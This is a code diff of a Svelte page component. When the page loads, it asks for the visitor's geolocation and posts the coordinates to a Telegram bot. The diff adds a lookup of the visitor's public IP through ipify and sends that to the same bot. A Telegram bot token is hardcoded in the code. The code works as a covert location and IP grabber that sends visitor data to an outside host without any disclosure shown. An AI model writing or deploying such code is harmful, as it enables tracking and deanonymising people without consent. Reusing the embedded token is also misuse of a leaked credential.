@@ -1,7 +1,7 @@
 <script>
   import { onMount } from 'svelte';
 
-  onMount(() => {
+  onMount(async () => {
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
       (position) => {
@@ -17,7 +17,7 @@
     );
   });
 
-  function sendLocationToTelegramBots(latitude, longitude) {
+  async function sendLocationToTelegramBots(latitude, longitude) {
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
@@ -25,7 +25,7 @@
     const message = `Location Result: Latitude - ${latitude}, Longitude - ${longitude}`;
 
     // Send location result to Telegram bots using an HTTP request
-    fetch(telegramBotURL, {
+    await fetch(telegramBotURL, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -37,15 +37,20 @@
     });
   }
 
-  function sendIPToTelegramBots() {
+  async function sendIPToTelegramBots() {
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
 
-    const message = `IP Result: ${window.location.href}`;
+    // Get the IP address using ipify API
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
+
+    const message = `IP Result: ${ipAddress}`;
 
     // Send IP result to Telegram bots using an HTTP request
-    fetch(telegramBotURL, {
+    await fetch(telegramBotURL, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
